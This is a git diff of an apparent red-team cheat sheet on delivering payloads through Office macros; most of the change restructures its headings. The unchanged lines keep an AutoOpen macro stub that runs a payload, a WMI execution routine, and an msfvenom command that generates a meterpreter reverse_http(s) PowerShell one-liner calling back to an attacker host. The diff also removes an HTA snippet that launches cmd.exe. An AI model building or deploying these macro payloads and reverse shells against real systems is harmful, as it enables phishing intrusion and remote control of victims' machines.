@@ -1,8 +1,6 @@
-# Payload Delivery
+# Macros Template
 
-## 01 - Macros
-
-### 1.1 - Templates
+## 01 - Base
 
 Base template when macro is being executed.
 
@@ -15,6 +13,8 @@ Sub AutoOpen()
     Payload
 End Sub
 ```
+
+## 02 - Command Execution
 
 Command execution.
 
@@ -51,7 +51,7 @@ Sub WMI_Execution()
 End Sub
 ```
 
-### 1.2 - Macro Formatting
+## 03 - Macro Formatting
 
 Generate a powershell one liner.
 
@@ -59,7 +59,7 @@ Generate a powershell one liner.
 $ msfvenom -p windows/x64/meterpreter/reverse_http[s] lhost=<IP> lport=<PORT> exitfunc=thread -f psh-cmd
 ```
 
-#### 1.2.1 - Bash
+### 3.1 - Bash
 
 ```bash
 #!/bin/bash
@@ -78,7 +78,7 @@ do
 done
 ```
 
-#### 1.2.2 - Python
+### 3.2 - Python
 
 ```python
 #!/usr/bin/env python
@@ -90,7 +90,7 @@ for i in range(0, len(string), n):
     print("Str = Str + \"" + string[i:i+n] + "\"")
 ```
 
-#### 1.2.3 - Perl
+### 3.3 - Perl
 
 ```perl
 #!/usr/bin/env perl
@@ -111,7 +111,7 @@ for(my $i = 0; $i < scalar(@characters); $i++) {
 print $concatenated_string;
 ```
 
-#### 1.2.4 - Go
+### 3.4 - Go
 
 ```go
 package main
@@ -137,16 +137,7 @@ func main() {
 
 ## 02 - HTA
 
-```vbscript
-<html>
-    <body>
-        <script>
-        var shell = 'cmd.exe';
-        new ActiveXObject('WScript.Shell').Run(shell);
-        </script>
-    </body>
-</html>
-```
+
 
 
 ---
